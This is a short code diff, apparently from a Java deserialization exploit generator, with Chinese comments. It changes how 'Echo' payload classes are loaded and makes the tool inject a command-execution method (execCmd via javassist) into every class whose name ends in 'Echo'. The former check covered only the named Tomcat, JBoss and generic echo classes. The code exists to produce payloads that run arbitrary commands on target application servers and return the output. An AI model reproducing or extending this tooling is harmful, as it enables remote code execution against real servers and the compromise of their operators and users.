@@ -132,6 +132,11 @@ public class Gadgets {
 
 				clazz = Class.forName(packageName + name, false, Gadgets.class.getClassLoader());
 			} else {
+
+				if (command.endsWith("Echo")) {
+					packageName += "echo.";
+				}
+
 				// 这里不能让它初始化，不然从线程中获取 WebappClassLoaderBase 时会强制类型转换异常。
 				clazz = Class.forName(packageName + command, false, Gadgets.class.getClassLoader());
 			}
@@ -190,7 +195,7 @@ public class Gadgets {
 			ctClass = pool.get(className);
 
 			// 动态为 Echo回显类 添加执行命令功能
-			if (className.contains("TomcatEcho") || className.contains("AllEcho")|| className.contains("JbossEcho")) {
+			if (className.endsWith("Echo")) {
 				insertCMD(ctClass);
 				ctClass.getDeclaredMethod("q").setBody("{return execCmd($1);}");
 
